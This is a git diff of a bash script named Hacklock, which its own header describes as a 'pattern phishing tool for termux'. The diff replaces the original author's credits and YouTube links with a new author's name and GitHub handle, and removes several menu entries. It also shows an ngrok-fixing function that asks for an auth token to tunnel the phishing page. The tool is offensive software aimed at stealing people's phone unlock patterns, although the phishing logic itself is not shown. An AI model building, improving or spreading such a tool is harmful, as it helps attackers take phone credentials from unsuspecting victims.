@@ -1,6 +1,6 @@
 #!/bin/bash
-# Hacklock by Nitro
-#youtube.com/noobhackers
+# Hacklock by Dead_body770
+#github.com/Dead_body770
 #not for illegel use
 #pattern phishing tool for termux no root.
 clear
@@ -60,14 +60,7 @@ command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not inst
 menu() {
 
 printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Hack pattern\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m\e[1;93m More Tools\e[0m\n"
-#printf "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m\e[1;93m Video\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m\e[1;93m Chat\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m4\e[0m\e[1;92m]\e[0m\e[1;93m Fix \e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m5\e[0m\e[1;92m]\e[0m\e[1;93m Follow\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m6\e[0m\e[1;92m]\e[0m\e[1;93m Update\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m7\e[0m\e[1;92m]\e[0m\e[1;93m About \e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m8\e[0m\e[1;92m]\e[0m\e[1;93m Subscribe\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m9\e[0m\e[1;92m]\e[0m\e[1;93m Exit\e[0m\n"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m' option
 
@@ -134,9 +127,9 @@ printf "\e[1;92m  _|_|_|_|  _|    _|  _|        _|_|      _|        _|    _|  _|
 printf "\e[1;92m  _|    _|  _|    _|  _|        _|  _|    _|        _|    _|  _|        _|  _|\e[0m\n"
 printf "\e[1;92m  _|    _|    _|_|_|    _|_|_|  _|    _|  _|_|_|_|    _|_|      _|_|_|  _|    _| v1.2 \e[0m\n"
 printf "\n"
-printf "                  \e[104m\e[1;77m  >>  Script By N17R0 << \e[0m\n"
+printf "                  \e[104m\e[1;77m  >>  Script By Dead_Body770 << \e[0m\n"
 printf "\n"
-printf "           \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m Noob Hackers \e[100m\e[1;77m << \e[0m\n"
+printf "           \e[100m\e[1;77m >>  github : \e[1;96m Dead_Body770 \e[100m\e[1;77m << \e[0m\n"
 printf "\n"
 printf "    \e[101m\e[1;77m #>   Note: Turn on mobile hotspot to get link.....!  <# \e[0m\n"
 printf "\n"
@@ -288,11 +281,10 @@ fixer(){
   cd $HOME
   ls -a >/dev/null 2>&1
   rm -rf .ngrok2 >/dev/null 2>&1
-  printf "\e[1;92m WATCH THIS VIDEO www.noob-hackers.com\e[0m\n"
 read -p $'\n\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] NGROK AUTH CODE : \e[0m' name
 ./ngrok authtoken $name >/dev/null 2>&1
 printf "\e[1;92m[\e[0m*\e[1;92m] NGROK FIXED SUCCESSFULLY:\e[0m\e[1;77m %s\e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] IF ITS NOT SOLVED THEN USE OPTION CHAT\e[0m\e[1;77m %s\e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] IF ITS NOT SOLVED THEN chat me\e[0m\e[1;77m %s\e[0m\n"
 sleep 6.0
 bash main.sh
 }
